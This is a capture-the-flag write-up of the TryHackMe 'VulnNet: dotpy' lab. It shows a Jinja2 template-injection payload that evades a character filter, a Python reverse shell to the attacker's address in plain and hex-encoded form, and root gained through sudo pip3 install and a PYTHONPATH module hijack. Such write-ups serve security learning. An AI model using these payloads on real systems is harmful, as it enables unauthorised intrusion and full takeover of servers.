---
title: THM VulnNet Dotpy
author: hanhctf
date: 2023-05-01 20:22:22 +0700
categories: [Write-up, THM]
tags: [SSTI]
toc: true
mermaid: true
---

# [**_VulnNet: dotpy room_**](https://tryhackme.com/room/vulnnetdotpy)

## Nmap

```shell
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 17:30 +07
Nmap scan report for 10.10.87.9
Host is up (0.23s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.87.9:8080/login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
```

See only port 8080 is open with backend developed by python3.6.9

## Web Enumeration

After analyze web page --> SSTI in 404 page.

![](/commons/THM/Vulnnet-dotpy/0_SSTI.png)

We can try some payloads

{% raw %}

```
{{ config }}
{% debug %}
{{ ().__class__.__base__.__subclasses__() }}
```

{% endraw %}

And see server block some characters.
![](/commons/THM/Vulnnet-dotpy/1_invalid_characters.png)

Brute-force with 'Intruder', we can find character that was blocked.
![](/commons/THM/Vulnnet-dotpy/2_characters_blocked.png)

After research, we can run payload on this [site](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

Without {% raw %} `{{ . [ ] }} _` {% endraw %}

{% raw %}

```
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
```

{% endraw %}

![](/commons/THM/Vulnnet-dotpy/3_RCE.png)

We can use useful tool [ctf-party](https://github.com/noraj/ctf-party)
to convert payload to hex

Shell code that we use:

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.51.36",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

![](/commons/THM/Vulnnet-dotpy/4_shell_convert.png)

Converted to hex:

```
\x70\x79\x74\x68\x6f\x6e\x33\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x22\x31\x30\x2e\x38\x2e\x35\x31\x2e\x33\x36\x22\x2c\x39\x30\x30\x31\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x20\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x70\x74\x79\x3b\x20\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x62\x61\x73\x68\x22\x29\x27
```

![](/commons/THM/Vulnnet-dotpy/5_got_shell.png)

With `sudo -l` we can run `pip3 install` with user `system-adm`

```shell
web@vulnnet-dotpy:~/shuriken-dotpy$ sudo -l
sudo -l                                                                                                              
Matching Defaults entries for web on vulnnet-dotpy:                                                                  
    env_reset, mail_badpass,                                                                                         
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                         
                                                                                                                     
User web may run the following commands on vulnnet-dotpy:                                                            
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

Search on [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)
we can privilege escalation to system-adm user.

```shell
web@vulnnet-dotpy:~$ mkdir /tmp/pwn && TF=/tmp/pwn
web@vulnnet-dotpy:~$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.51.36",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > $TF/setup.py
sudo -u system-adm /usr/bin/pip3 install $TF
```

And listen on other terminal --> got shell from `system-adm`

***GOT USER FLAG***

## Privilege Escalation

```shell
system-adm@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

**SETENV** allows to set an en viroment variable.

Let's look at `/opt/backup.py`

```python
from datetime import datetime
from pathlib import Path
import zipfile


OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY


object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue

# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)                                                                                                                                                                                     
                                                                                                                                                                                                                                             
# Get the amount of past backup zips in the backup directory already                                                                                                                                                                         
existing_backups = [                                                                                                                                                                                                                         
    x for x in backup_directory_path.iterdir()                                                                                                                                                                                               
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')                                                                                                                                                                   
]                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                             
# Enforce max backups and delete oldest if there will be too many after the new backup                                                                                                                                                       
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))                                                                                                                                                       
while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon                                                                                                                                     
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)                                                                                                                                                                                
    backup_to_delete.unlink()                                                                                                                                                                                                                
                                                                                                                                                                                                                                             
# Create zip file (for both file and folder options)                                                                                                                                                                                         
backup_file_name = f'backup-{datetime.now().strftime("%Y%m%d%H%M%S")}-{object_to_backup_path.name}.zip'                                                                                                                                      
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')                                                                                                                                                          
if object_to_backup_path.is_file():                                                                                                                                                                                                          
    # If the object to write is a file, write the file                                                                                                                                                                                       
    zip_file.write(                                                                                                                                                                                                                          
        object_to_backup_path.absolute(),                                                                                                                                                                                                    
        arcname=object_to_backup_path.name,                                                                                                                                                                                                  
        compress_type=zipfile.ZIP_DEFLATED                                                                                                                                                                                                   
    )                                                                                                                                                                                                                                        
elif object_to_backup_path.is_dir():                                                                                                                                                                                                         
    # If the object to write is a directory, write all the files                                                                                                                                                                             
    for file in object_to_backup_path.glob('**/*'):                                                                                                                                                                                          
        if file.is_file():                                                                                                                                                                                                                   
            zip_file.write(                                                                                                                                                                                                                  
                file.absolute(),                                                                                                                                                                                                             
                arcname=str(file.relative_to(object_to_backup_path)),                                                                                                                                                                        
                compress_type=zipfile.ZIP_DEFLATED                                                                                                                                                                                           
            )                                                                                                                                                                                                                                
# Close the created zip file
zip_file.close()
```

We don't need understand what the script does, we can set `PYTHONPATH` and the script will try to load the modules from here when importing.

```shell
system-adm@vulnnet-dotpy:/tmp$ mkdir priv
system-adm@vulnnet-dotpy:/tmp$ cd priv
system-adm@vulnnet-dotpy:/tmp/priv$ echo 'import pty;pty.spawn("/bin/bash")' > /tmp/priv/zipfile.py
system-adm@vulnnet-dotpy:/tmp/priv$ sudo -u root PYTHONPATH=/tmp/priv /usr/bin/python3 /opt/backup.py
root@vulnnet-dotpy:/tmp/priv# 
```

***GOT ROOT FLAG***
